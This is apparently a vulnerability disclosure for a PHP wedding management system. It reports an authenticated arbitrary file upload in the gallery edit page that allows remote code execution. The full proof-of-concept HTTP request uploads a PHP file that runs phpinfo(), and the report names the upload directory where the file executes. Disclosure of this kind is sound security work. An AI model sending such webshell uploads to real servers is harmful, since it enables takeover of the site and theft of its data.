# WeddingManagement System v1.0 by codeastr.com has arbitrary code execution (RCE)

vendor: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability url: http://ip/Wedding-Management/admin/photos_edit.php?id=37

Loophole location：The editing function of "Gallery" module in the background management system-- > there is an arbitrary file upload vulnerability (RCE) in the picture upload point of "photos_edit.php" file.

Click "Edit" to save

Request package for file upload：

```sql
POST /Wedding-Management/admin/photos_edit.php?id=37 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/Wedding-Management/admin/photos_edit.php?id=37
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------30999215895801
Content-Length: 826

-----------------------------30999215895801
Content-Disposition: form-data; name="booking_id"

34
-----------------------------30999215895801
Content-Disposition: form-data; name="title"


-----------------------------30999215895801
Content-Disposition: form-data; name="caption"


-----------------------------30999215895801
Content-Disposition: form-data; name="alternate_text"


-----------------------------30999215895801
Content-Disposition: form-data; name="description"


-----------------------------30999215895801
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------30999215895801
Content-Disposition: form-data; name="submit"

Edit
-----------------------------30999215895801--
```

The files will be uploaded to this directory \admin\upload\gallery\

![image](https://user-images.githubusercontent.com/54017627/167980065-e4b1ed4e-23bb-42f5-a31a-a17443a0a53a.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/167980032-7a1783a7-b257-429a-ae06-8954c38f8fc5.png)
